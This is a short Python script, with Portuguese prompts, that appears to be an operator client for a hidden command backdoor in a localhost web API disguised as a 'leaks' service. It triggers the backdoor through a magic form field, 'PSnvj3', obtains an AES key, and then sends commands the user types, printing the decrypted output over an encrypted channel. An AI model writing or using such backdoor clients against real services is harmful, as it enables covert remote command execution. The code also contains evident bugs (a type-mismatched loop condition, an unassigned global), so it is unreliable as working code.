import requests
from funcrion_crypt import *
proxies = {
	 "http": "http://127.0.0.1:8080",
	 "https":"http://127.0.0.1:8080",
	}

headers = {'Content-type': 'application/x-www-form-urlencoded'}
key= "" 
repetrt = 0

def start():
	
	urls=["http://127.0.0.1:5001/all_leaks", "http://127.0.0.1:5001/find_leak/3", "http://127.0.0.1:5001/alt_leak/2/23", "http://127.0.0.1:5001/dell_leak/1"]
	data="PSnvj3=1"

	for url in urls:	
		repetrt=requests.post(url, data=data, headers=headers).text.replace("\n","")
def keyy():	
	key = str(requests.put("http://127.0.0.1:5001/all_leaks", data="key_key=1",headers=headers).text).replace('"','').replace('\n','')
	return key




while repetrt == "0":
	start()
url="http://127.0.0.1:5001/create_leak/00/11/22/33"
comand = "PSnvj3=exit"
requests.post(url, data=comand, headers=headers)
start()


key = keyy()


on = 0

while on == 0:
	comand = "PSnvj3="
	comand = comand + input("Informe o comando \n")
	resp=str(requests.post(url, data=comand, headers=headers).text).replace('"','').replace('\n','')
	
	if resp == "{message: Internal Server Error}":
		kk = bytes("comando nao encontrado", encoding='utf8')
		resp = aes_cpt(key,kk)

	if comand == "PSnvj3=exit":
		break
	else:
		rel= aes_des(key,resp)
		print(rel)
